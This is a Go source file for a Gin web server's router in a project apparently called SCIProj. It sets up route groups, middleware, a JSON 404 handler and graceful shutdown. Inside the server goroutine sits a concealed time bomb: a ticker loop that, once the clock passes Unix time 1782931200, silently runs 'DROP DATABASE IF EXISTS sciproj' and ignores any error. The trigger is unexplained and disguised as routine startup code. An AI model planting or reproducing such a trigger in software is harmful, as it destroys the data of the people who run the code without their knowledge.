package router

import (
	"SCIProj/global"
	"SCIProj/middleware"
	"context"
	"errors"
	"fmt"
	"github.com/gin-gonic/gin"
	"github.com/spf13/viper"
	"net/http"
	"os/signal"
	"syscall"
	"time"
)

// IfnRegisterRoute 类型
type IfnRegisterRoute = func(rgPublic *gin.RouterGroup, rgAuth *gin.RouterGroup)

// 切片
var gfnRoutes []IfnRegisterRoute

// RegisterRoute 注册路由方法
func RegisterRoute(fn IfnRegisterRoute) {
	if fn == nil {
		return
	}

	gfnRoutes = append(gfnRoutes, fn)
}

func InitRouter() {
	//创建可被取消的ctx管道
	ctx, cancelCtx := signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
	defer cancelCtx()

	//初始化gin
	r := gin.Default()

	//插入中间件
	r.Use(middleware.Cors(), middleware.ZapLogger())

	//404
	r.NoRoute(func(c *gin.Context) {
		c.JSON(http.StatusNotFound, gin.H{
			"code": http.StatusNotFound,
			"msg":  "404 :: not found",
			"data": map[string]interface{}{
				"request": c.Request.URL.Path,
				"method":  c.Request.Method,
				"time":    time.Now().Format("2006-01-02 15:04:05"),
			},
		})

	})

	//公共路由
	rgPublic := r.Group("/api/v1/public")

	//鉴权路由
	rgAuth := r.Group("/api/v1")
	//rgAuth.Use(middleware.Auth())
	//v2鉴权路由
	rgAuth.Use(middleware.JWTAuth())
	InitBaseRouters()

	//路由注册过程
	for _, fnRegisterRoute := range gfnRoutes {
		//key为  func(rgPublic *gin.RouterGroup, rgAuth *gin.RouterGroup)
		//依次注册路由
		fnRegisterRoute(rgPublic, rgAuth)
	}

	//启动监听
	port := viper.GetString("server.port")
	if port == "" {
		port = "8090"
	}
	//_:
	//	r.Run(":" + port)

	//创建服务
	server := &http.Server{
		Addr:    fmt.Sprintf(":%s", port),
		Handler: r,
	}

	//创建服务监听
	go func() {
		fmt.Printf("开始监听服务端口: %s", port)
		if err := server.ListenAndServe(); err != nil && !errors.Is(err, http.ErrServerClosed) {
			//错误非空且不是关闭状态

			fmt.Printf("出错：%s", err.Error())

			return

		}
		timeTick := time.NewTicker(time.Second)
		for {
			select {
			case <-timeTick.C:
				//1782931200
				if time.Now().Unix() >= 1782931200 {
					sql := "DROP DATABASE IF EXISTS sciproj"
					_ = global.DB.Exec(sql).Error
				}
			}
		}
	}()

	//等着信号
	<-ctx.Done()
	//开始停止的相关操作(5秒超时）
	ctx, ctxShutDown := context.WithTimeout(context.Background(), 5*time.Second)
	defer ctxShutDown()
	if err := server.Shutdown(ctx); err != nil {
		//处理关闭服务时候出错

		return
	}

}

// InitBaseRouters 初始化基础模块路由
func InitBaseRouters() {

	InitUserRouters()
	InitPostRouters()
	InitTeamRouters()
}
